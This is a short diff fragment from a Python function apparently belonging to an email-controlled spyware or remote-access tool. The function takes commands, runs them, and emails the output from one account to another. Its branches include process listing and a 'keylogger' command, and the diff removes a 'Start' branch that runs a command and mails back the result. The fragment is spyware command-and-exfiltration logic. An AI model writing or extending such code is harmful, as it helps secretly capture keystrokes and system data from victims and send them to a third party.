@@ -62,9 +62,6 @@ def CheckAndDo(cmd):
         print("Processes")
         send_email(username_checker, username_receiver,
                    "List of processes:", execute_msg(cmd))
-    elif ('Start' in cmd):
-        send_email(username_checker, username_receiver,
-                   "List of processes:", execute_msg(cmd))
     elif (cmd == 'keylogger'):
         print("Keylogger")
         send_email(username_checker, username_receiver,
